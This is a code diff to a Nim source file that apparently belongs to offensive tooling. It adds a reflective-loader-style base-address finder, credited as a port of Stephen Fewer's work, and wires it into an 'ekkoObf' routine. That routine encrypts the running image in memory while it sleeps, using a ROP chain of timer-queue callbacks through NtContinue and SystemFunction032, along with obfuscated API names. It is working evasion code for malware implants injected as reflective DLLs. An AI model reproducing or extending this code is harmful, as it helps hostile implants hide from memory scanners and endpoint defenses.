@@ -16,6 +16,29 @@ type
 
 randomize()
 
+# Find the start of the DLL by matching the magic bytes. This is a Nim implementation of the infamous Reflective Loader by Stephen Fewer
+# Original Work: https://github.com/stephenfewer/ReflectiveDLLInjection
+proc findBaseAddress(start: PVOID): PVOID =
+  var candidate: PVOID = start
+  var candidateMZ: PIMAGE_DOS_HEADER
+  var candidatePE: PIMAGE_NT_HEADERS
+  var offset: LONG
+
+  while true:
+    candidateMZ = cast[PIMAGE_DOS_HEADER](candidate)
+
+    # Match the MZ magic bytes
+    if candidateMZ.e_magic == IMAGE_DOS_SIGNATURE: 
+      # Sanity Check
+      offset = candidateMZ.e_lfanew
+      if offset > sizeof(IMAGE_DOS_HEADER) and offset < 1024:
+        candidatePE = cast[PIMAGE_NT_HEADERS](candidate + offset)
+        # Match the PE magic bytes
+        if candidatePE.Signature == IMAGE_NT_SIGNATURE:
+          return candidate
+    # Check the next address
+    candidate = candidate - 1
+
 proc ekkoObf*(st: int): VOID =
   var CtxThread: CONTEXT
   var RopProtRW: CONTEXT
@@ -43,7 +66,7 @@ proc ekkoObf*(st: int): VOID =
   hTimerQueue = CreateTimerQueue()
   NtContinue = GetProcAddress(GetModuleHandleA(obf("Ntdll")), obf("NtContinue"))
   SysFunc032 = GetProcAddress(LoadLibraryA(obf("Advapi32")), obf("SystemFunction032"))
-  ImageBase = cast[PVOID](GetModuleHandleA(LPCSTR(nil)))
+  ImageBase = findBaseAddress(cast[PVOID](findBaseAddress))
   ImageSize = (cast[PIMAGE_NT_HEADERS](ImageBase +
       (cast[PIMAGE_DOS_HEADER](ImageBase)).e_lfanew)).OptionalHeader.SizeOfImage
   Key.Buffer = KeyBuf.addr
@@ -57,7 +80,7 @@ proc ekkoObf*(st: int): VOID =
     WaitForSingleObject(hEvent, 0x32)
     copyMem(addr(RopProtRW), addr(CtxThread), sizeof((CONTEXT)))
     copyMem(addr(RopMemEnc), addr(CtxThread), sizeof((CONTEXT)))
-    copyMem(addr(RopDelay), addr(CtxThread), sizeof((CONTEXT)))
+    copyMem(addr(RopDelay),  addr(CtxThread), sizeof((CONTEXT)))
     copyMem(addr(RopMemDec), addr(CtxThread), sizeof((CONTEXT)))
     copyMem(addr(RopProtRX), addr(CtxThread), sizeof((CONTEXT)))
     copyMem(addr(RopSetEvt), addr(CtxThread), sizeof((CONTEXT)))
@@ -101,8 +124,8 @@ proc ekkoObf*(st: int): VOID =
                           addr(RopProtRW), 100, 0, WT_EXECUTEINTIMERTHREAD)
     CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                           addr(RopMemEnc), 200, 0, WT_EXECUTEINTIMERTHREAD)
-    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue), addr(RopDelay),
-                          300, 0, WT_EXECUTEINTIMERTHREAD)
+    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue), 
+                          addr(RopDelay),  300, 0, WT_EXECUTEINTIMERTHREAD)
     CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                           addr(RopMemDec), 400, 0, WT_EXECUTEINTIMERTHREAD)
     CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
